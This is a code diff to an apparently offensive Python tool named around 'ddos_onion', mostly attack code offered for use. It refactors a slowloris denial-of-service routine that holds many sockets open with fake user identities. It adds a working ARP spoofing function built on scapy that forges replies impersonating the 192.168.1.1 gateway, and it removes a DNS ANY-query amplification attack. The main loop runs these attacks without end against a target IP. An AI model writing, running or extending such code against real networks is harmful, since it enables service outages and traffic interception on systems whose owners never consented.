@@ -4,8 +4,7 @@ import random
 import logging
 from argparse import ArgumentParser
 import time
-import dns.message
-import dns.query
+import scapy.all as scapy
 
 DEFAULT_USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/5.3",
@@ -26,19 +25,18 @@ def init_socket(ip: str, port, identity):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(DEFAULT_SOCK_TIMEOUT)
 
-    s.connect((ip, port))
+    try:
+        s.connect((ip, port))
+        send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1", identity)
 
-    send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1", identity)
+        ua = DEFAULT_USER_AGENTS[0]
+        send_line(s, f"User-Agent: {ua}", identity)
+        send_line(s, "Accept-language: en-US,en,q=0.5", identity)
 
-    ua = DEFAULT_USER_AGENTS[0]
-    send_line(s, f"User-Agent: {ua}", identity)
-    send_line(s, "Accept-language: en-US,en,q=0.5", identity)
-
-    return s
-
-def dns_attack(target, query_name):
-    request = dns.message.make_query(query_name, dns.rdatatype.ANY)
-    response = dns.query.tcp(request, target)
+        return s
+    except socket.error as e:
+        logging.debug("Failed to create new socket: %s", e)
+        return None
 
 def tcp_attack(target_ip, target_port):
     # Implement TCP attack logic here
@@ -49,8 +47,8 @@ def udp_attack(target_ip, target_port):
     pass  # Placeholder, replace with actual code
 
 def arp_attack(target_ip, target_mac):
-    # Implement ARP attack logic here
-    pass  # Placeholder, replace with actual code
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="192.168.1.1")
+    scapy.send(packet, verbose=False)
 
 def slowloris_iteration(list_of_sockets):
     logging.debug("Sending keep-alive headers...")
@@ -84,16 +82,12 @@ def ddos_onion():
     list_of_sockets = []
 
     for _ in range(num_connections):  # Number of initial connections
-        try:
-            s = init_socket(target_ip, target_port, generate_fake_identity())
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
-            break
+        new_socket = init_socket(target_ip, target_port, generate_fake_identity())
+        if new_socket:
+            list_of_sockets.append(new_socket)
 
     while True:
         slowloris_iteration(list_of_sockets)
-        dns_attack(target_ip, "example.com")
         tcp_attack(target_ip, target_port)
         udp_attack(target_ip, target_port)
         arp_attack(target_ip, "00:00:00:00:00:00")
